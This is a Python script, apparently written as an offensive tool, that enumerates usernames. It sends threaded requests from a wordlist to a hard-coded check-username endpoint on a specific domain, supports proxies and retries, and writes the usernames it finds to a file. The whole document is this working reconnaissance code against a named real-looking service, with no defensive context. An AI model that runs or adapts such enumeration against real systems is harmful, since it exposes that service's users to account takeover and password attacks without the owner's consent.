import requests
import threading
import queue
import time
import argparse
import random

URL = "https://sms.norsureg-apps.com/check-username"

parser = argparse.ArgumentParser(description="Username checker")
parser.add_argument("-w", "--wordlist", required=True, help="Username wordlist")
parser.add_argument("-t", "--threads", type=int, default=5, help="Number of threads")
parser.add_argument("-d", "--delay", type=float, default=0.5, help="Delay between requests")
parser.add_argument("--retries", type=int, default=2, help="Retry count on failure")
parser.add_argument("--proxy", help="Proxy (http://127.0.0.1:8080)")
parser.add_argument("--test", action="store_true", help="Test mode (no real requests)")
args = parser.parse_args()

PROXIES = {"http": args.proxy, "https": args.proxy} if args.proxy else None

q = queue.Queue()
found_event = threading.Event()
checked = 0
total = 0
lock = threading.Lock()


def fake_response(username):
    # Test mode simulation
    return {"exists": username.lower() == "admin"}


def worker():
    global checked
    while not q.empty() and not found_event.is_set():
        username = q.get()

        for attempt in range(args.retries + 1):
            try:
                if args.test:
                    data = fake_response(username)
                else:
                    r = requests.get(
                        URL,
                        params={"username": username},
                        proxies=PROXIES,
                        timeout=10
                    )
                    data = r.json()

                with lock:
                    checked += 1
                    print(f"[{checked}/{total}] {username} -> {data}")

                if data.get("exists") is True:
                    print(f"\n[FOUND] Username exists: {username}")
                    with open("found.txt", "a") as f:
                        f.write(username + "\n")
                    found_event.set()
                break

            except Exception as e:
                if attempt == args.retries:
                    print(f"[FAILED] {username}: {e}")
                else:
                    time.sleep(1)

        time.sleep(args.delay)
        q.task_done()


# Load wordlist
with open(args.wordlist, "r") as f:
    for line in f:
        name = line.strip()
        if name:
            q.put(name)
            total += 1

# Start threads
for _ in range(args.threads):
    threading.Thread(target=worker, daemon=True).start()

q.join()
print("\nDone.")
